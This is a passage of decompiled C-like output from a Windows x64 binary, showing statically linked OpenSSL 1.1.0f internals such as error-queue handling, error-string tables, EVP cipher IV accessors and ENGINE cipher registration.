        sub_14003ED50((__int64)v6, (__int64)v5);
        v5 += 4;
        if ( !*v5 )
          break;
        v6 = (_QWORD *)qword_140140998;
      }
    }
  }
  sub_140025CE0((_DWORD *)qword_1401409B0);
  v7 = &dword_140134CF0;
  sub_140025D20((_DWORD *)qword_1401409B0);
  v8 = (_QWORD *)qword_140140998;
  if ( qword_140140998
    || (v8 = sub_14003EE70(
               (__int64 (__fastcall *)(char *))sub_140024C90,
               (int (__cdecl *)(const char *, const char *))sub_140024C80),
        (qword_140140998 = (__int64)v8) != 0) )
  {
    if ( dword_140134CF0 )
    {
      while ( 1 )
      {
        *v7 |= 0x2000000u;
        sub_14003ED50((__int64)v8, (__int64)v7);
        v7 += 4;
        if ( !*v7 )
          break;
        v8 = (_QWORD *)qword_140140998;
      }
    }
  }
  sub_140025CE0((_DWORD *)qword_1401409B0);
  sub_1400249B0();
  v9 = &dword_1401409C0;
  sub_140025D20((_DWORD *)qword_1401409B0);
  v10 = (_QWORD *)qword_140140998;
  if ( qword_140140998
    || (v10 = sub_14003EE70(
                (__int64 (__fastcall *)(char *))sub_140024C90,
                (int (__cdecl *)(const char *, const char *))sub_140024C80),
        (qword_140140998 = (__int64)v10) != 0) )
  {
    if ( dword_1401409C0 )
    {
      while ( 1 )
      {
        *v9 |= 0x2000000u;
        sub_14003ED50((__int64)v10, (__int64)v9);
        v9 += 4;
        if ( !*v9 )
          break;
        v10 = (_QWORD *)qword_140140998;
      }
    }
  }
  sub_140025CE0((_DWORD *)qword_1401409B0);
  return 1i64;
}
// 140134AC0: using guessed type int dword_140134AC0;
// 140134CF0: using guessed type int dword_140134CF0;
// 140134E20: using guessed type int dword_140134E20;
// 140140994: using guessed type _DWORD dword_140140994;
// 140140998: using guessed type __int64 qword_140140998;
// 1401409A0: using guessed type int dword_1401409A0;
// 1401409B0: using guessed type __int64 qword_1401409B0;
// 1401409C0: using guessed type int dword_1401409C0;

//----- (0000000140024410) ----------------------------------------------------
__int64 __fastcall sub_140024410(int a1, _DWORD *a2)
{
  __int64 result; // rax

  result = sub_1400241F0();
  if ( (_DWORD)result )
  {
    sub_140024BE0(a1, a2);
    return 1i64;
  }
  return result;
}

//----- (0000000140024460) ----------------------------------------------------
__int64 sub_140024460()
{
  __int64 v0; // rcx
  int v1; // eax

  v0 = sub_140024090();
  v1 = *(_DWORD *)(v0 + 516);
  if ( v1 == *(_DWORD *)(v0 + 512) )
    return 0i64;
  else
    return *(unsigned int *)(v0 + 4i64 * ((v1 + 1) % 16) + 64);
}
// 140024090: using guessed type __int64 sub_140024090(void);

//----- (00000001400244B0) ----------------------------------------------------
__int64 sub_1400244B0()
{
  __int64 v0; // rcx
  __int64 v1; // rax

  v0 = sub_140024090();
  v1 = *(int *)(v0 + 512);
  if ( *(_DWORD *)(v0 + 516) == (_DWORD)v1 )
    return 0i64;
  else
    return *(unsigned int *)(v0 + 4 * v1 + 64);
}
// 140024090: using guessed type __int64 sub_140024090(void);

//----- (00000001400244F0) ----------------------------------------------------
__int64 sub_1400244F0()
{
  __int64 v0; // rbx
  int i; // eax
  __int64 v2; // rcx
  __int64 v3; // rax

  v0 = sub_140024090();
  for ( i = *(_DWORD *)(v0 + 512); *(_DWORD *)(v0 + 516) != i; *(_DWORD *)(v0 + 512) = i )
  {
    if ( (*(_BYTE *)(v0 + 4i64 * i) & 1) != 0 )
      break;
    *(_DWORD *)(v0 + 4i64 * i) = 0;
    *(_DWORD *)(v0 + 4i64 * *(int *)(v0 + 512) + 64) = 0;
    v2 = *(int *)(v0 + 512);
    if ( (*(_BYTE *)(v0 + 4 * v2 + 256) & 1) != 0 )
    {
      sub_14001D930(*(void **)(v0 + 8 * v2 + 128));
      *(_QWORD *)(v0 + 8i64 * *(int *)(v0 + 512) + 128) = 0i64;
    }
    *(_DWORD *)(v0 + 4i64 * *(int *)(v0 + 512) + 256) = 0;
    *(_QWORD *)(v0 + 8i64 * *(int *)(v0 + 512) + 320) = 0i64;
    *(_DWORD *)(v0 + 4i64 * (int)(*(_DWORD *)(v0 + 512))-- + 448) = -1;
    i = *(_DWORD *)(v0 + 512);
    if ( i == -1 )
      i = 15;
  }
  v3 = *(int *)(v0 + 512);
  if ( *(_DWORD *)(v0 + 516) == (_DWORD)v3 )
    return 0i64;
  *(_DWORD *)(v0 + 4 * v3) &= ~1u;
  return 1i64;
}
// 140024090: using guessed type __int64 sub_140024090(void);

//----- (0000000140024610) ----------------------------------------------------
__int64 __fastcall sub_140024610(int a1, __int16 a2, __int16 a3, __int64 a4, int a5)
{
  char *v9; // rbx
  int v10; // eax
  int v11; // ecx
  __int64 v12; // rcx
  __int64 result; // rax

  v9 = sub_140024090();
  v10 = (*((_DWORD *)v9 + 128) + 1) % 16;
  v11 = *((_DWORD *)v9 + 129);
  *((_DWORD *)v9 + 128) = v10;
  if ( v10 == v11 )
    *((_DWORD *)v9 + 129) = (v11 + 1) % 16;
  *(_DWORD *)&v9[4 * v10] = 0;
  *(_DWORD *)&v9[4 * *((int *)v9 + 128) + 64] = a3 & 0xFFF | (((a1 << 12) | a2 & 0xFFF) << 12);
  *(_QWORD *)&v9[8 * *((int *)v9 + 128) + 320] = a4;
  *(_DWORD *)&v9[4 * *((int *)v9 + 128) + 448] = a5;
  v12 = *((int *)v9 + 128);
  if ( (v9[4 * v12 + 256] & 1) != 0 )
  {
    sub_14001D930(*(void **)&v9[8 * v12 + 128]);
    *(_QWORD *)&v9[8 * *((int *)v9 + 128) + 128] = 0i64;
  }
  result = *((int *)v9 + 128);
  *(_DWORD *)&v9[4 * result + 256] = 0;
  return result;
}

//----- (0000000140024730) ----------------------------------------------------
__int64 __fastcall sub_140024730(int a1)
{
  int v2; // eax
  __int64 v3; // rdi
  int v4; // edx
  int v6; // esi
  _QWORD *v7; // rbx
  int v8[6]; // [rsp+20h] [rbp-18h] BYREF

  v2 = sub_140025C90(&dword_140140994, (void (*)(void))sub_140024A80);
  v3 = 0i64;
  v4 = 0;
  if ( v2 )
    v4 = dword_1401409A0;
  if ( !v4 )
    return 0i64;
  v6 = a1 & 0xFFF;
  v8[0] = a1 & 0xFF000FFF;
  v7 = 0i64;
  sub_140025C50((_DWORD *)qword_1401409B0);
  if ( qword_140140998 )
    v7 = sub_14003EF50(qword_140140998, (__int64)v8);
  sub_140025CE0((_DWORD *)qword_1401409B0);
  if ( v7 )
    return v7[1];
  v7 = 0i64;
  v8[0] = v6;
  sub_140025C50((_DWORD *)qword_1401409B0);
  if ( qword_140140998 )
    v7 = sub_14003EF50(qword_140140998, (__int64)v8);
  sub_140025CE0((_DWORD *)qword_1401409B0);
  if ( v7 )
    return v7[1];
  return v3;
}
// 140140994: using guessed type _DWORD dword_140140994;
// 140140998: using guessed type __int64 qword_140140998;
// 1401409A0: using guessed type int dword_1401409A0;
// 1401409B0: using guessed type __int64 qword_1401409B0;

//----- (0000000140024820) ----------------------------------------------------
void __fastcall sub_140024820(__int64 a1, int a2)
{
  __int64 v4; // rbx
  int v5; // r8d
  __int64 v6; // rdi

  v4 = sub_140024090();
  v5 = *(_DWORD *)(v4 + 512);
  if ( !v5 )
    v5 = 15;
  v6 = v5;
  if ( (*(_BYTE *)(v4 + 4i64 * v5 + 256) & 1) != 0 )
  {
    sub_14001D930(*(void **)(v4 + 8i64 * v5 + 128));
    *(_QWORD *)(v4 + 8 * v6 + 128) = 0i64;
  }
  *(_QWORD *)(v4 + 8 * v6 + 128) = a1;
  *(_DWORD *)(v4 + 4 * v6 + 256) = a2;
}
// 140024090: using guessed type __int64 sub_140024090(void);

//----- (00000001400248C0) ----------------------------------------------------
__int64 sub_1400248C0()
{
  __int64 v0; // rcx
  __int64 v1; // rax

  v0 = sub_140024090();
  v1 = *(int *)(v0 + 512);
  if ( *(_DWORD *)(v0 + 516) == (_DWORD)v1 )
    return 0i64;
  *(_DWORD *)(v0 + 4 * v1) |= 1u;
  return 1i64;
}
// 140024090: using guessed type __int64 sub_140024090(void);

//----- (0000000140024900) ----------------------------------------------------
__int64 __fastcall sub_140024900(int a1, _DWORD *a2)
{
  int v4; // eax
  int v5; // edx
  __int64 v7; // rcx

  v4 = sub_140025C90(&dword_140140994, (void (*)(void))sub_140024A80);
  v5 = 0;
  if ( v4 )
    v5 = dword_1401409A0;
  if ( !v5 )
    return 0i64;
  sub_140025D20((_DWORD *)qword_1401409B0);
  v7 = qword_140140998;
  if ( qword_140140998 && *a2 )
  {
    while ( 1 )
    {
      if ( a1 )
        *a2 |= a1 << 24;
      sub_14003EAA0(v7, (__int64)a2);
      a2 += 4;
      if ( !*a2 )
        break;
      v7 = qword_140140998;
    }
  }
  sub_140025CE0((_DWORD *)qword_1401409B0);
  return 1i64;
}
// 140140994: using guessed type _DWORD dword_140140994;
// 140140998: using guessed type __int64 qword_140140998;
// 1401409A0: using guessed type int dword_1401409A0;
// 1401409B0: using guessed type __int64 qword_1401409B0;

//----- (00000001400249B0) ----------------------------------------------------
__int64 sub_1400249B0()
{
  char **v1; // rbx
  char *v2; // rsi
  int i; // edi
  bool v4; // zf

  sub_140025D20((_DWORD *)qword_1401409B0);
  if ( !dword_140134FD4 )
    return sub_140025CE0((_DWORD *)qword_1401409B0);
  v1 = (char **)&unk_1401409C8;
  v2 = (char *)&unk_1401411C0;
  for ( i = 1; i <= 127; ++i )
  {
    v4 = *v1 == 0i64;
    *((_DWORD *)v1 - 2) = i;
    if ( v4 )
    {
      if ( sub_14003C0E0(i, v2, 0x20ui64) )
        *v1 = v2;
      if ( !*v1 )
        *v1 = "unknown";
    }
    v2 += 32;
    v1 += 2;
  }
  dword_140134FD4 = 0;
  return sub_140025CE0((_DWORD *)qword_1401409B0);
}
// 140134FD4: using guessed type int dword_140134FD4;
// 1401409B0: using guessed type __int64 qword_1401409B0;

//----- (0000000140024A80) ----------------------------------------------------
_DWORD *sub_140024A80()
{
  _DWORD *result; // rax

  sub_14001E0C0(0i64, 0i64);
  result = sub_140025C10();
  qword_1401409B0 = (__int64)result;
  dword_1401409A0 = result != 0i64;
  return result;
}
// 14001E0C0: using guessed type __int64 __fastcall sub_14001E0C0(_QWORD, _QWORD);
// 1401409A0: using guessed type int dword_1401409A0;
// 1401409B0: using guessed type __int64 qword_1401409B0;

//----- (0000000140024AC0) ----------------------------------------------------
void sub_140024AC0()
{
  sub_140025B60(dword_1401409A8);
  sub_140025BE0((_DWORD *)qword_1401409B0);
  qword_1401409B0 = 0i64;
}
// 1401409A8: using guessed type _DWORD dword_1401409A8[2];
// 1401409B0: using guessed type __int64 qword_1401409B0;

//----- (0000000140024B00) ----------------------------------------------------
void sub_140024B00()
{
  char *v0; // rbx

  v0 = (char *)sub_140024090();
  if ( v0 )
  {
    sub_140025CC0(dword_1401409A8, 0i64);
    sub_1400239A0(v0);
  }
}
// 140024090: using guessed type __int64 sub_140024090(void);
// 1401409A8: using guessed type _DWORD dword_1401409A8[2];

//----- (0000000140024B40) ----------------------------------------------------
__int64 sub_140024B40()
{
  __int64 result; // rax

  result = sub_140025BA0(dword_1401409A8);
  dword_1401409A4 = result;
  return result;
}
// 1401409A4: using guessed type int dword_1401409A4;
// 1401409A8: using guessed type _DWORD dword_1401409A8[2];

//----- (0000000140024B70) ----------------------------------------------------
__int64 sub_140024B70()
{
  __int64 result; // rax
  int v1; // ecx

  result = sub_140025C90(&dword_140140994, (void (*)(void))sub_140024A80);
  v1 = 0;
  if ( (_DWORD)result )
    v1 = dword_1401409A0;
  if ( v1 )
  {
    sub_140025D20((_DWORD *)qword_1401409B0);
    sub_14003ECA0(qword_140140998);
    qword_140140998 = 0i64;
    return sub_140025CE0((_DWORD *)qword_1401409B0);
  }
  return result;
}
// 140140994: using guessed type _DWORD dword_140140994;
// 140140998: using guessed type __int64 qword_140140998;
// 1401409A0: using guessed type int dword_1401409A0;
// 1401409B0: using guessed type __int64 qword_1401409B0;

//----- (0000000140024BE0) ----------------------------------------------------
__int64 __fastcall sub_140024BE0(int a1, _DWORD *a2)
{
  _QWORD *v4; // rax

  sub_140025D20((_DWORD *)qword_1401409B0);
  v4 = (_QWORD *)qword_140140998;
  if ( qword_140140998
    || (v4 = sub_14003EE70(
               (__int64 (__fastcall *)(char *))sub_140024C90,
               (int (__cdecl *)(const char *, const char *))sub_140024C80),
        (qword_140140998 = (__int64)v4) != 0) )
  {
    if ( *a2 )
    {
      while ( 1 )
      {
        if ( a1 )
          *a2 |= a1 << 24;
        sub_14003ED50((__int64)v4, (__int64)a2);
        a2 += 4;
        if ( !*a2 )
          break;
        v4 = (_QWORD *)qword_140140998;
      }
    }
  }
  return sub_140025CE0((_DWORD *)qword_1401409B0);
}
// 140140998: using guessed type __int64 qword_140140998;
// 1401409B0: using guessed type __int64 qword_1401409B0;

//----- (0000000140024C80) ----------------------------------------------------
__int64 __fastcall sub_140024C80(_DWORD *a1, _DWORD *a2)
{
  return (unsigned int)(*a1 - *a2);
}

//----- (0000000140024C90) ----------------------------------------------------
__int64 __fastcall sub_140024C90(_DWORD *a1)
{
  unsigned int v1; // r8d

  v1 = *a1 ^ ((unsigned int)(*a1 ^ (*a1 >> 12)) >> 12) & 0xFFF;
  return v1 ^ (13 * (v1 % 0x13));
}

//----- (0000000140024CD0) ----------------------------------------------------
__int64 __fastcall sub_140024CD0(__int64 a1)
{
  return *(unsigned int *)(*(_QWORD *)a1 + 4i64);
}

//----- (0000000140024CF0) ----------------------------------------------------
__int64 __fastcall sub_140024CF0(__int64 a1)
{
  return *(unsigned int *)(a1 + 16);
}

//----- (0000000140024D00) ----------------------------------------------------
__int64 __fastcall sub_140024D00(__int64 a1)
{
  return *(_QWORD *)(a1 + 112);
}

//----- (0000000140024D20) ----------------------------------------------------
__int64 __fastcall sub_140024D20(__int64 a1)
{
  return a1 + 40;
}

//----- (0000000140024D30) ----------------------------------------------------
__int64 __fastcall sub_140024D30(__int64 a1)
{
  return *(unsigned int *)(a1 + 104);
}

//----- (0000000140024D40) ----------------------------------------------------
__int64 __fastcall sub_140024D40(__int64 a1)
{
  return *(unsigned int *)(a1 + 88);
}

//----- (0000000140024D50) ----------------------------------------------------
__int64 __fastcall sub_140024D50(__int64 a1)
{
  return a1 + 24;
}

//----- (0000000140024D60) ----------------------------------------------------
void __fastcall sub_140024D60(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 108) |= a2;
}

//----- (0000000140024D70) ----------------------------------------------------
void __fastcall sub_140024D70(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 88) = a2;
}

//----- (0000000140024D80) ----------------------------------------------------
__int64 __fastcall sub_140024D80(__int64 a1, unsigned int a2)
{
  return a2 & *(_DWORD *)(a1 + 108);
}

//----- (0000000140024D90) ----------------------------------------------------
__int64 __fastcall sub_140024D90(__int64 a1, __int64 a2)
{
  __int64 (*v2)(void); // r8
  int v4; // eax
  unsigned int v5; // eax

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 64i64);
  if ( v2 )
    return v2();
  v4 = *(_DWORD *)(*(_QWORD *)a1 + 16i64);
  if ( (v4 & 0x1000) != 0 )
  {
    v5 = v4 & 0xF0007;
    if ( v5 < 6 )
      return sub_140024E00(a1, a2);
    if ( v5 > 7 && v5 != 65537 )
    {
      if ( v5 == 65538 )
        return 1i64;
      if ( v5 != 65539 )
        return sub_140024E00(a1, a2);
    }
  }
  return 0xFFFFFFFFi64;
}

//----- (0000000140024E00) ----------------------------------------------------
__int64 __fastcall sub_140024E00(__int64 a1, __int64 a2)
{
  unsigned int v2; // ebx
  size_t v4; // rdi
  int v5; // eax

  v2 = 0;
  if ( a2 )
  {
    v4 = *(unsigned int *)(*(_QWORD *)a1 + 12i64);
    if ( (unsigned int)v4 > 0x10 )
      sub_1400234A0("assertion failed: l <= sizeof(c->iv)", "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_lib.c", 82i64);
    v5 = sub_14003FF60(a2, (void *)(a1 + 24), v4);
    v2 = v5;
    if ( v5 != (_DWORD)v4 )
      return 0xFFFFFFFFi64;
    if ( v5 > 0 )
      memmove((void *)(a1 + 40), (const void *)(a1 + 24), v4);
  }
  return v2;
}

//----- (0000000140024EA0) ----------------------------------------------------
__int64 __fastcall sub_140024EA0(__int64 a1)
{
  return *(unsigned int *)(a1 + 12);
}

//----- (0000000140024EB0) ----------------------------------------------------
__int64 __fastcall sub_140024EB0(__int64 a1)
{
  return *(unsigned int *)(a1 + 8);
}

//----- (0000000140024EC0) ----------------------------------------------------
__int64 __fastcall sub_140024EC0(_BYTE *a1, __int64 a2)
{
  _DWORD *v2; // r8
  __int64 (__fastcall *v3)(_BYTE *, __int64, _DWORD *, __int64); // rax
  int v5; // eax
  unsigned int v6; // eax

  v2 = *(_DWORD **)a1;
  v3 = *(__int64 (__fastcall **)(_BYTE *, __int64, _DWORD *, __int64))(*(_QWORD *)a1 + 56i64);
  if ( v3 )
    return v3(a1, a2, v2, a2);
  v5 = v2[4];
  if ( (v5 & 0x1000) == 0 )
    return 0xFFFFFFFFi64;
  v6 = v5 & 0xF0007;
  if ( v6 < 6 )
    return sub_140024F50(a1, a2);
  if ( v6 <= 7 || v6 == 65537 )
    return 0xFFFFFFFFi64;
  if ( v6 != 65538 )
  {
    if ( v6 != 65539 )
      return sub_140024F50(a1, a2);
    return 0xFFFFFFFFi64;
  }
  if ( *v2 == 246 )
    sub_14003F350(a2, 5, 0i64);
  return 1i64;
}

//----- (0000000140024F50) ----------------------------------------------------
__int64 __fastcall sub_140024F50(_BYTE *a1, __int64 a2)
{
  unsigned int v2; // ebx

  if ( !a2 )
    return 0i64;
  v2 = *(_DWORD *)(*(_QWORD *)a1 + 12i64);
  if ( v2 > 0x10 )
    sub_1400234A0("assertion failed: j <= sizeof(c->iv)", "..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_lib.c", 99i64);
  return sub_140040070(a2, a1 + 24, v2);
}

//----- (0000000140024FD0) ----------------------------------------------------
__int64 __fastcall sub_140024FD0(unsigned int *a1)
{
  unsigned int v1; // edi
  __int64 result; // rax
  char **v3; // rbx

  v1 = *a1;
  if ( (int)*a1 > 421 )
  {
    switch ( v1 )
    {
      case 0x1A9u:
      case 0x28Bu:
      case 0x28Eu:
        result = 425i64;
        break;
      case 0x1ADu:
      case 0x28Cu:
      case 0x28Fu:
        result = 429i64;
        break;
      case 0x28Au:
      case 0x28Du:
        return 421i64;
      case 0x290u:
      case 0x291u:
      case 0x292u:
      case 0x293u:
LABEL_10:
        result = 30i64;
        break;
      default:
LABEL_11:
        v3 = sub_14002C0F0(v1);
        if ( !sub_14002BEF0((__int64)v3) )
          v1 = 0;
        sub_14003F4D0((__int64)v3);
        result = v1;
        break;
    }
  }
  else if ( v1 == 421 )
  {
    return 421i64;
  }
  else
  {
    switch ( v1 )
    {
      case 5u:
      case 0x61u:
        result = 5i64;
        break;
      case 0x1Eu:
      case 0x3Du:
        goto LABEL_10;
      case 0x25u:
      case 0x62u:
      case 0xA6u:
        result = 37i64;
        break;
      default:
        goto LABEL_11;
    }
  }
  return result;
}

//----- (0000000140025270) ----------------------------------------------------
__int64 __fastcall sub_140025270(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD))(*(_QWORD *)a1 + 32i64))(a1, a2, a3, a4);
}

//----- (0000000140025290) ----------------------------------------------------
void __fastcall sub_140025290(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 16) &= ~a2;
}

//----- (00000001400252A0) ----------------------------------------------------
__int64 __fastcall sub_1400252A0(__int64 a1)
{
  if ( a1 )
    return *(_QWORD *)a1;
  else
    return 0i64;
}

//----- (00000001400252B0) ----------------------------------------------------
void __fastcall sub_1400252B0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 16) |= a2;
}

//----- (00000001400252C0) ----------------------------------------------------
__int64 __fastcall sub_1400252C0(__int64 a1, unsigned int a2)
{
  return a2 & *(_DWORD *)(a1 + 16);
}

//----- (00000001400252D0) ----------------------------------------------------
__int64 __fastcall sub_1400252D0(__int64 a1)
{
  return *(unsigned int *)(a1 + 56);
}

//----- (00000001400252E0) ----------------------------------------------------
void __fastcall sub_1400252E0(void *a1)
{
  sub_14001D930(a1);
}

//----- (0000000140025310) ----------------------------------------------------
_DWORD *__fastcall sub_140025310(int a1, int a2)
{
  int v2; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v2 + 40));
  if ( result )
  {
    *result = a1;
    result[1] = a2;
  }
  return result;
}
// 140025334: variable 'v2' is possibly undefined

//----- (0000000140025360) ----------------------------------------------------
__int64 __fastcall sub_140025360(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 60) = a2;
  return 1i64;
}

//----- (0000000140025370) ----------------------------------------------------
__int64 __fastcall sub_140025370(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 32) = a2;
  return 1i64;
}

//----- (0000000140025380) ----------------------------------------------------
__int64 __fastcall sub_140025380(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 12) = a2;
  return 1i64;
}

//----- (0000000140025390) ----------------------------------------------------
__int64 __fastcall sub_140025390(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 16) = a2;
  return 1i64;
}

//----- (00000001400253A0) ----------------------------------------------------
__int64 __fastcall sub_1400253A0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 56) = a2;
  return 1i64;
}

//----- (00000001400253B0) ----------------------------------------------------
__int64 __fastcall sub_1400253B0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 8) = a2;
  return 1i64;
}

//----- (00000001400253C0) ----------------------------------------------------
__int64 __fastcall sub_1400253C0(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 24) = a2;
  return 1i64;
}

//----- (00000001400253D0) ----------------------------------------------------
__int64 __fastcall sub_1400253D0(__int64 a1)
{
  int v1; // eax

  if ( a1 )
    return *(unsigned int *)(a1 + 8);
  sub_140024610(v1 - 50, v1 + 106, v1 + 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_lib.c", 304);
  return 0xFFFFFFFFi64;
}
// 1400253F4: variable 'v1' is possibly undefined

//----- (0000000140025410) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_140025410(__int64 a1, unsigned int a2))()
{
  __int64 (__fastcall **result)(); // rax

  result = sub_1400254B0();
  if ( result )
  {
    result = (__int64 (__fastcall **)())result[3];
    if ( result )
      return (__int64 (__fastcall **)())((__int64 (__fastcall *)(__int64, _QWORD))result)(a1, a2);
  }
  return result;
}

//----- (0000000140025460) ----------------------------------------------------
__int64 __fastcall sub_140025460(__int64 a1, unsigned int a2)
{
  __int64 (__fastcall **v4)(); // rax
  __int64 (__fastcall *v5)(); // rax

  v4 = sub_1400254B0();
  if ( v4 && (v5 = v4[1]) != 0i64 )
    return ((__int64 (__fastcall *)(__int64, _QWORD))v5)(a1, a2);
  else
    return 0xFFFFFFFFi64;
}

//----- (00000001400254B0) ----------------------------------------------------
__int64 (__fastcall **sub_1400254B0())()
{
  int v0; // eax
  int v1; // ecx
  __int64 (__fastcall **v3)(); // rbx
  __int64 v4; // rax
  __int64 v5; // rdi

  v0 = sub_140025C90(&dword_1401422C0, (void (*)(void))sub_140025660);
  v1 = 0;
  if ( v0 )
    v1 = dword_1401422C4;
  if ( !v1 )
    return 0i64;
  sub_140025D20((_DWORD *)qword_1401422B8);
  v3 = (__int64 (__fastcall **)())qword_1401422B0;
  if ( !qword_1401422B0 )
  {
    v4 = sub_140040CD0();
    v5 = v4;
    if ( v4 )
    {
      qword_1401422B0 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(v4);
      v3 = (__int64 (__fastcall **)())qword_1401422B0;
      if ( qword_1401422B0 )
      {
        qword_1401422A0 = v5;
        goto LABEL_10;
      }
      sub_140025890(v5);
    }
    v3 = sub_140040720();
    qword_1401422B0 = (__int64)v3;
  }
LABEL_10:
  sub_140025CE0((_DWORD *)qword_1401422B8);
  return v3;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);
// 140040CD0: using guessed type __int64 sub_140040CD0(void);
// 1401422A0: using guessed type __int64 qword_1401422A0;
// 1401422B0: using guessed type __int64 qword_1401422B0;
// 1401422B8: using guessed type __int64 qword_1401422B8;
// 1401422C0: using guessed type _DWORD dword_1401422C0;
// 1401422C4: using guessed type int dword_1401422C4;

//----- (0000000140025570) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_140025570(__int64 a1, unsigned int a2))()
{
  __int64 (__fastcall **result)(); // rax

  result = sub_1400254B0();
  if ( result )
  {
    result = (__int64 (__fastcall **)())*result;
    if ( result )
      return (__int64 (__fastcall **)())((__int64 (__fastcall *)(__int64, _QWORD))result)(a1, a2);
  }
  return result;
}

//----- (00000001400255B0) ----------------------------------------------------
__int64 __fastcall sub_1400255B0(__int64 a1)
{
  int v2; // eax
  int v3; // edx

  v2 = sub_140025C90(&dword_1401422C0, (void (*)(void))sub_140025660);
  v3 = 0;
  if ( v2 )
    v3 = dword_1401422C4;
  if ( !v3 )
    return 0i64;
  sub_140025D20((_DWORD *)qword_1401422B8);
  sub_140025890(qword_1401422A0);
  qword_1401422A0 = 0i64;
  qword_1401422B0 = a1;
  sub_140025CE0((_DWORD *)qword_1401422B8);
  return 1i64;
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);
// 1401422A0: using guessed type __int64 qword_1401422A0;
// 1401422B0: using guessed type __int64 qword_1401422B0;
// 1401422B8: using guessed type __int64 qword_1401422B8;
// 1401422C0: using guessed type _DWORD dword_1401422C0;
// 1401422C4: using guessed type int dword_1401422C4;

//----- (0000000140025630) ----------------------------------------------------
__int64 sub_140025630()
{
  __int64 (__fastcall **v0)(); // rax
  __int64 (*v1)(void); // rcx

  v0 = sub_1400254B0();
  if ( v0 && (v1 = v0[5]) != 0i64 )
    return v1();
  else
    return 0i64;
}

//----- (0000000140025660) ----------------------------------------------------
_DWORD *sub_140025660()
{
  bool v0; // bl
  _DWORD *result; // rax

  qword_1401422A8 = (__int64)sub_140025C10();
  v0 = qword_1401422A8 != 0;
  result = sub_140025C10();
  qword_1401422B8 = (__int64)result;
  dword_1401422C4 = v0 && result != 0i64;
  return result;
}
// 1401422A8: using guessed type __int64 qword_1401422A8;
// 1401422B8: using guessed type __int64 qword_1401422B8;
// 1401422C4: using guessed type int dword_1401422C4;

//----- (00000001400256B0) ----------------------------------------------------
void sub_1400256B0()
{
  void (*v0)(void); // rcx

  if ( qword_1401422B0 )
  {
    v0 = *(void (**)(void))(qword_1401422B0 + 16);
    if ( v0 )
      v0();
  }
  sub_1400255B0(0i64);
  sub_140025BE0((_DWORD *)qword_1401422B8);
  sub_140025BE0((_DWORD *)qword_1401422A8);
}
// 1401422A8: using guessed type __int64 qword_1401422A8;
// 1401422B0: using guessed type __int64 qword_1401422B0;
// 1401422B8: using guessed type __int64 qword_1401422B8;

//----- (0000000140025700) ----------------------------------------------------
__int64 __fastcall sub_140025700(__int64 a1, unsigned int a2)
{
  unsigned int (__fastcall *v2)(__int64, __int64 *, _QWORD, _QWORD); // rax
  __int64 v4; // [rsp+40h] [rbp+8h] BYREF

  v2 = *(unsigned int (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD))(a1 + 56);
  if ( v2 && v2(a1, &v4, 0i64, a2) )
    return v4;
  sub_140024610(38, 185, 146, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\tb_cipher.c", 74);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140025760) ----------------------------------------------------
__int64 __fastcall sub_140025760(int a1)
{
  return sub_1400417E0(&qword_1401422C8, a1);
}
// 1401422C8: using guessed type __int64 qword_1401422C8;

//----- (0000000140025780) ----------------------------------------------------
__int64 __fastcall sub_140025780(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, int **, _QWORD); // rax
  int v3; // eax
  int *v5; // [rsp+40h] [rbp+8h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, int **, _QWORD))(a1 + 56);
  if ( v1 && (v3 = v1(a1, 0i64, &v5, 0i64), v3 > 0) )
    return sub_140041620(&qword_1401422C8, (__int64)sub_140025870, a1, v5, v3, 0);
  else
    return 1i64;
}
// 1401422C8: using guessed type __int64 qword_1401422C8;

//----- (00000001400257F0) ----------------------------------------------------
__int64 __fastcall sub_1400257F0(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 56) = a2;
  return 1i64;
}

//----- (0000000140025800) ----------------------------------------------------
__int64 __fastcall sub_140025800(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, int **, _QWORD); // rax
  int v3; // eax
  int *v5; // [rsp+40h] [rbp+8h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, int **, _QWORD))(a1 + 56);
  if ( v1 && (v3 = v1(a1, 0i64, &v5, 0i64), v3 > 0) )
    return sub_140041620(&qword_1401422C8, (__int64)sub_140025870, a1, v5, v3, 1);
  else
    return 1i64;
}
// 1401422C8: using guessed type __int64 qword_1401422C8;

//----- (0000000140025870) ----------------------------------------------------
__int64 sub_140025870()
{
  return sub_140041580(&qword_1401422C8);
}
// 1401422C8: using guessed type __int64 qword_1401422C8;

//----- (0000000140025890) ----------------------------------------------------
__int64 __fastcall sub_140025890(__int64 a1)
{
  unsigned int v3; // ebx
  bool v4; // zf

  if ( !a1 )
    return 1i64;
  sub_140025D20((_DWORD *)qword_140147E80);
  v3 = 1;
